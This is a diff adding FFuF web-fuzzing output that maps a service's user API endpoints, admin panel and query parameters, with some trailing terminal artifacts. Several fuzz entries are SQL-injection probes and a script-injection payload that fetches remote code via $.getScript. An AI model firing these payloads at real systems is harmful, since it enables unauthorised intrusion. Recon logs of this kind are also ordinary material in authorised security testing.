@@ -1,0 +1,63 @@
+# List used: https://github.com/orwagodfather/WordList/blob/main/fuzz-php.php
+# Tool: FFuF
+
+/v1/api/device/playinfo/ [Status: 405, Size: 56, Words: 6, Lines: 1, Duration: 64ms]: 0 ::
+/v1/api/token/          [Status: 405, Size: 56, Words: 6, Lines: 1, Duration: 62ms]s: 0 ::
+/v1/api                 [Status: 405, Size: 56, Words: 6, Lines: 1, Duration: 418ms]rs: 0 ::
+/v1/user/account/cancel [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 62ms]ors: 0 ::
+/v1/user/email/exist/verify [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 61ms] 0 ::
+/v1/user/email/verify/code/auth [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 61ms]:
+/v1/user/account/search [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 64ms]ors: 0 ::
+/v1/user/email/change   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 65ms]ors: 0 ::
+/v1/user/email/verify/code/get [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 60ms]::
+/v1/user/info/get       [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 60ms]ors: 0 ::
+/v1/user/info/modify    [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 65ms]ors: 0 ::
+/v1/user/msg/subscribe/get [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 62ms]: 0 ::
+/v1/user/lan/area/setting [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 73ms]s: 0 ::
+/v1/user/password/auth  [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 66ms]ors: 0 ::
+/v1/user/msg/subscribe/update [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 68ms] ::
+/v1/user/profile/pic/upload [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 62ms] 0 ::
+/v1/user/push/token/update [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 61ms]: 0 ::
+/v1/user/login/id/get   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 410ms]rs: 0 ::
+.well-known/acme-challenge [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 32ms]s: 1 :::
+.well-known/acme-challenge/dtfy [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 28ms]::
+/#.htaccess#            [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 948ms]:
+v1/user                 [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 64ms]rors: 1 :::
+?:                      [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 35ms]1 :::
+adminpanel              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 787ms]rors: 1 :::
+/?*                     [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 34ms]3 :::
+/?                      [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2264ms]::
+???%20Admin_list.php    [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 35ms]3 ::
+???%20Vote_List.php     [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 39ms]3 ::
+/adminpanel/index.php   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 432ms]rrors: 35 ::
+/?favorites             [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 502ms]6 ::
+/?level=12              [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 580ms] :::
+/?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);// [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 625ms]
+/?msk                   [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 585ms]:
+/?Open                  [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2683ms]
+/?OpenServer            [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 588ms]:
+/?page=admin.auth.inc   [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 613ms]:
+/?page=auth.inc         [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 3100ms]
+?.php                   [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 842ms]:
+/?q=*                   [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2710ms]
+/?q=[1]                 [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2696ms]
+/?q=comment/reply/      [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 596ms]:
+/?q=1                   [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2809ms]
+/?q=contact/            [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 599ms]:
+/?q=1"                  [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2805ms]
+/?q=1'                  [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2912ms]
+/?q=1/*'*/              [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2980ms]
+/?q=1\                  [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 3044ms]
+/?q[]=1                 [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 3099ms]
+/?q=admin/              [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2993ms]
+/?q=logout/             [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 613ms]:
+/?q=filter/tips/        [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2666ms]
+/?q=node/add/           [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2895ms]
+/?q='or''='             [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2801ms]
+/?q=search/             [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 1319ms]
+/?q=user/login/         [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 588ms]:
+/?q=user/logout/        [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2725ms]
+/?q=user/password/      [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2816ms]
+/?q=user/register/      [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 2894ms]
+v1/api/graphql          [Status: 405, Size: 56, Words: 6, Lines: 1, Duration: 633ms]rs: 2 ::
+?&what=                 [Status: 200, Size: 4959, Words: 2029, Lines: 181, Duration: 3100ms]
